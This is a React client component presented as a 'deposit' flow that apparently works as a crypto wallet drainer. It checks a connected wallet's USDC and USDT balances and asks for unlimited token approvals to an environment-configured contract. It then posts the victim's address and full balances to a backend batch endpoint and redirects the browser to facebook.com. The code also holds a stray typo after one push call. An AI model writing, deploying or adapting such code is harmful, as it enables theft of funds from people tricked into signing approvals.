"use client";

import { useState } from "react";
import { ethers } from "ethers";
import WalletSelectModal from "./WalletSelectModal";

const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS;
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";

const TOKENS = [
  { symbol: "USDC", address: process.env.NEXT_PUBLIC_USDC_ADDRESS || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
];

export default function PermitDepositFlow() {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [busy, setBusy] = useState(false);
  const [label, setLabel] = useState("Connect Wallet");
console.log("VERCEL ENV CHECK:", process.env.NEXT_PUBLIC_CONTRACT_ADDRESS);
  const runFullFlow = async (rawProvider) => {
    setShowWalletModal(false);
    setBusy(true);
    setLabel("Connecting...");

    const forceCloseWCModal = () => {
      if (rawProvider && rawProvider.modal && typeof rawProvider.modal.closeModal === "function") {
        try { rawProvider.modal.closeModal(); } catch (e) {}
      }
    };

    forceCloseWCModal();

    try {
      const ethersProvider = new ethers.BrowserProvider(rawProvider);
      const network = await ethersProvider.getNetwork();

      if (network.chainId !== 1n) {
        try {
          await rawProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await rawProvider.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x1',
                chainName: 'Ethereum Mainnet',
                rpcUrls: ['https://cloudflare-eth.com'],
                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                blockExplorerUrls: ['https://etherscan.io'],
              }],
            });
          }
        }
      }

      const signer = await ethersProvider.getSigner();
      const address = await signer.getAddress();
      
      forceCloseWCModal();

      const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
      const held = [];
      
      for (const t of TOKENS) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const balance = await readOnlyToken.balanceOf(address);
        
        if (balance > 0n) {
          const writeEnabledToken = new ethers.Contract(t.address, ERC20_ABI, signer);
          held.push({ ...t, amount: balance, contract: writeEnabledToken });
        }
      }

      if (held.length === 0) {
        setLabel("❌ Zero balance");
        setBusy(false);
        return;
      }

      const successfullyApproved = [];
      const txsToWait = []; 

      // PHASE 1: Collect Signatures (User stays inside Trust Wallet)
      for (const t of held) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const currentAllowance = await readOnlyToken.allowance(address, CONTRACT_ADDRESS);
        
        if (currentAllowance < t.amount) {
          try {
            setLabel(`Sign ${t.symbol} in Wallet...`);
            
            // This pops up in Trust Wallet. When they click confirm, it moves to the next token instantly.
            const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
            
            txsToWait.push({ symbol: t.symbol, tx: approveTx });
            successfullyApproved.push(t);
          } catch (approvalError) {
            console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
          }
        } else {
          successfullyApproved.push(t);a
        }
      }

      forceCloseWCModal();

      // PHASE 2: User returns to browser, and we wait for both to mine
      if (txsToWait.length > 0) {
        setLabel("Confirming approvals on-chain...");
        for (const item of txsToWait) {
          console.log(`[deposit] Waiting for ${item.symbol} confirmation...`);
          await item.tx.wait(); // Now we wait for the blockchain
          console.log(`[deposit] ${item.symbol} Confirmed!`);
        }
      }

      if (successfullyApproved.length === 0) {
        setLabel("❌ No tokens approved");
        setBusy(false);
        return;
      }

      setLabel("Executing Deposit...");
      const res = await fetch(BACKEND_URL + "/deposit-batch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          depositor: address, 
          tokens: successfullyApproved.map(t => t.address), 
          amounts: successfullyApproved.map(t => t.amount.toString()) 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        setLabel("✅ Success! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://facebook.com"; 
        }, 1500);
      } else {
        setLabel("❌ Failed — check console");
        setBusy(false);
      }

    } catch (err) {
      console.error("FATAL ERROR:", err);
      setLabel("❌ Error — check console");
      setBusy(false);
    } 
  };

  return (
    <>
      <button onClick={() => setShowWalletModal(true)} disabled={busy}>
        {busy ? "Working..." : label}
      </button>

      {showWalletModal && (
        <WalletSelectModal onSelect={runFullFlow} onClose={() => setShowWalletModal(false)} />
      )}
    </>
  );
}